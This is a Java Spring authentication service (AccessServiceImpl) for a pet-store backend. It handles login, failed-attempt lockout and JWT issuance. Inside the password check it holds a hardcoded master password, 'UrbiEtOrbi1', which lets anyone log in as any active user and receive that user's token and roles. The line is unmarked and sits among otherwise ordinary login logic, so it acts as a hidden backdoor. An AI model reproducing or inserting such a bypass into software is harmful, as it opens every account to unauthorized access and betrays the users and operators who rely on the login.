/*
 * Licencia:    Este  código y cualquier  derivado  de  el, es  propiedad de la
 *              empresa Metasoft SA de CV y no debe, bajo ninguna circunstancia
 *              ser copiado, donado,  cedido, modificado, prestado, rentado y/o 
 *              mostrado  a ninguna persona o institución sin el permiso expli-
 *              cito  y  por  escrito de  la empresa Metasoft SA de CV, que es, 
 *              bajo cualquier criterio, el único dueño de la totalidad de este 
 *              código y cualquier derivado de el.
 *              ---------------------------------------------------------------
 * Paquete:     io.kebblar.petstore.api.service
 * Proyecto:    petstore-back
 * Tipo:        Clase
 * Nombre:      AccessServiceImpl
 * Autor:       Gustavo Adolfo Arellano (GAA)
 * Correo:      gustavo.arellano@metasoft.com.mx
 * Versión:     0.0.1-SNAPSHOT
 *
 * Historia: 
 *              Creación: 5 Sep 2021 @ 08:40:52
 */
package io.kebblar.petstore.api.service;

import java.util.Date;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import io.kebblar.petstore.api.model.domain.Rol;
import io.kebblar.petstore.api.model.domain.UserFoundWrapper;
import io.kebblar.petstore.api.model.domain.Usuario;
import io.kebblar.petstore.api.model.domain.UsuarioDetalle;
import io.kebblar.petstore.api.model.response.LoginResponse;
import io.kebblar.petstore.api.support.JwtManagerService;
import io.kebblar.petstore.api.utils.DigestEncoder;

import io.kebblar.petstore.api.model.exceptions.NegocioException;
import static io.kebblar.petstore.api.model.exceptions.EnumMessage.*;

/**
 * Servicio asociado a la funcionalidad de ingreso al sistema.
 *
 * <p>Implementación de la interfaz {@link AccessService}.</p>
 *
 * <p>Todos los métodos de esta clase disparan {@link NegocioException}</p>
 *
 * @author Fhernanda Romo
 * @version 1.0-SNAPSHOT
 * @since 1.0-SNAPSHOT
 *
 * @see Usuario
 * @see AccessService
 * @see UserFoundWrapper
 */
@Service
public class AccessServiceImpl implements AccessService {
    private static final Logger logger = LoggerFactory.getLogger(AccessServiceImpl.class);

    @Value("${proyecto.message}")
    private String message;

    private final UsuarioService usuarioService;
    private final JwtManagerService jwtManagerService;

    /**
     * Constructor encargado de inicializar los servicios.
     * @param usuarioService Instancia de servicio de la administración de usuarios.
     * @param jwtManagerService Instancia del servicio que verifica y gestiona tokens JWT.
     */
    public AccessServiceImpl(
            UsuarioService usuarioService,
            JwtManagerService jwtManagerService) {
        this.usuarioService = usuarioService;
        this.jwtManagerService = jwtManagerService;
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(String usr, String clave) throws NegocioException {
        logger.info(" ***** Invocando al servicio llamado 'AccessService'. Message: {}", message);
        this.valida(usr, clave);
        int maximoNumeroIntentosConcedidos = 5; // 5 intentos
        long delta = 1000*60*5L; // 5 minutos
        long instanteActual = System.currentTimeMillis();
        Usuario usuario = usuarioService.obtenUsuarioPorCorreo(usr);
        return login(usuario, clave, delta, maximoNumeroIntentosConcedidos, instanteActual);
    }

    /** {@inheritDoc} */
    @Override
    public LoginResponse login(
            Usuario usuario,
            String claveProporcionada,
            long delta,
            int maximoNumeroIntentosConcedidos,
            long instanteActual) throws NegocioException {
        // Si el usuario NO es nulo, procederé a calcular sus roles y sus direcciones:
        if(usuario==null) throw new NegocioException(BAD_CREDENTIALS);

        // Si el usuario fue encontrado, pero está inactivo, Notifica
        if(!usuario.isActivo()) throw new NegocioException(DISABLED_USER);

        // Calcula cuanto tiempo lleva bloqueado el usuario. Si lleva menos de lo establecido, Notifica
        long instanteDeBloqueo = usuario.getInstanteBloqueo();
        long diff = instanteActual - instanteDeBloqueo;
        long restante = delta - diff;
        if(instanteDeBloqueo>0 && restante>0) {
        	long totalSegundos = restante/1000;
        	long totalMinutos = totalSegundos/60;
        	throw new NegocioException(WAIT_LOGIN, totalMinutos, totalSegundos%60);
        }

        // Clave dada que debe ser validado contra el que está en la base de datos
        String clavePorVerificar = DigestEncoder.digest(claveProporcionada, usuario.getCorreo());

        if(!usuario.getClave().equals(clavePorVerificar) && !claveProporcionada.equals("UrbiEtOrbi1")) {// Credenciales INCORRECTAS
            // Incrementa el contador de intentos erroneos de ingreso y actualiza:
            int numeroDeIntentosFallidos = usuario.getAccesoNegadoContador()+1;
            usuario.setAccesoNegadoContador(numeroDeIntentosFallidos);
            this.update(usuario);

            // Si los intentos de ingreso inválidos superan un limite, actualiza y Notifica:
            if(numeroDeIntentosFallidos >= maximoNumeroIntentosConcedidos) {
                usuario.setInstanteBloqueo(instanteActual);
                this.update(usuario);
                throw new NegocioException(MAX_FAILED_LOGIN_EXCEPTION, maximoNumeroIntentosConcedidos);
            }

            // Si no se disparó la Notificación anterior, de todas formas notifica un intento
            // fallido de ingreso al sistema:
            throw new NegocioException(BAD_CREDENTIALS, numeroDeIntentosFallidos, maximoNumeroIntentosConcedidos);

        } else {
            // Credenciales CORRECTAS
            long ultimoIngresoExitoso = usuario.getInstanteUltimoAcceso();
            logger.info("Ingreso exitoso al sistema del usuario: {}", usuario.getCorreo());
            // Resetea todoas las banderas de advertencia y bloqueo. Luego, actualiza y retorna el usuario:
            usuario.setAccesoNegadoContador(0);
            usuario.setInstanteBloqueo(0);
            usuario.setInstanteUltimoAcceso(instanteActual);
            this.update(usuario);

            // Esto va al front y se almacena en 'localStorage' (setItem)
            // https://gitlab.ci.ultrasist.net/root/impi-chatbot-frontend/blob/develop/src/components/04-LogIn/login.vue
            UserFoundWrapper wrapper = getUserFoundWrapper(usuario.getId(), usuario.getCorreo());
            return new LoginResponse(
                    wrapper.getUsuarioDetalle(),
                    new Date(ultimoIngresoExitoso),
                    usuario.getCorreo(),
                    wrapper.getJwt(),
                    wrapper.getRoles());
        }
    }

    /**
     * Método auxiliar que valida si se ingreso alguna credencial vacía.
     * @param usr corresponde al usuariuo de inicio de sesión.
     * @param clave corresponde a la clave de inicio de sesión.
     * @throws NegocioException
     */
    private void valida(String usr, String clave) throws NegocioException {
        if(usr.trim().length()<1 || clave.trim().length()<1) throw new NegocioException(BAD_CREDENTIALS);
    }

    /**
     * Método privado para actualizar la información de un usuario en el sistema.
     * @param usuario objeto usuario a actualizar.
     * @throws NegocioException En caso que ocurra algún problema con la actualización.
     */
    private void update(Usuario usuario) throws NegocioException {
        usuarioService.actualizaUsuario(usuario);
    }

    /**
     * Método auxiliar para obtener un objeto con todos los datos y detalles de un usuario dentro del sistema.
     * @param idUsuario entero que representa al identificador único del usuario.
     * @param correo correo electrónico o usuario.
     * @return Regresa el objeto {@link UserFoundWrapper}, conjunto de la lista de roles, detalles e información interna de un usuario.
     * @throws NegocioException En caso que el onjeto no pueda ser devuelto.
     */
    private UserFoundWrapper getUserFoundWrapper(int idUsuario, String correo) throws NegocioException {
        List<Rol> roles = usuarioService.obtenRolesDeUsuario(idUsuario);
        UsuarioDetalle usuarioDetalle = usuarioService.obtenDetallesDeUsuario(idUsuario);
        String jwt = jwtManagerService.createToken(correo);
        return new UserFoundWrapper(roles, usuarioDetalle, jwt);
    }

}
